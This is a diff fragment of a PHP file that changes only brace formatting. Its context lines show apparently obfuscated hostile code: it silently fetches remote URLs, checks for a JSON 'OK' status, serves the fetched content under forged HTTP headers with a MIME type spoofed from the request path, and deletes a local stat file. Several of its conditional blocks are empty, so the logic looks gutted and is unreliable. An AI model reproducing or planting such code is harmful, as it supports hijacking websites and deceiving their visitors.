@@ -44,11 +44,14 @@ foreach ($y11 as $o13) {
     $g14 = stream_context_create(['http' => ['timeout' => 10]]);
     $v15 = @file_get_contents($o13);
     if (empty($v15)) {
-    }$y16 = json_decode($v15, true);
+    }
+    $y16 = json_decode($v15, true);
     if (empty($y16) || $y16['status'] != 'OK') {
         continue;
-    }if ($q4) {
-    }header('HTTP/1.1 200 OK');
+    }
+    if ($q4) {
+    }
+    header('HTTP/1.1 200 OK');
     header('Date: '.gmdate('D, d M Y H:i:s', time()).' GMT');
     header('Accept-Ranges: bytes');
     header('Content-Length: '.$m10);
@@ -60,11 +63,14 @@ foreach ($y11 as $o13) {
     $s17 = 'image/gif';
     if (strpos($_SERVER['REQUEST_URI'], '.html') !== false) {
         $s17 = 'text/html';
-    }if (strpos($_SERVER['REQUEST_URI'], '.txt') !== false) {
+    }
+    if (strpos($_SERVER['REQUEST_URI'], '.txt') !== false) {
         $s17 = 'text/plain';
-    }if (strpos($_SERVER['REQUEST_URI'], '.jpg') !== false) {
+    }
+    if (strpos($_SERVER['REQUEST_URI'], '.jpg') !== false) {
         $s17 = 'image/jpeg';
-    }header('Content-Type: '.$s17);
+    }
+    header('Content-Type: '.$s17);
     @unlink(__DIR__.'/access_big__stat.txt');
     echo $e7;
     exit;
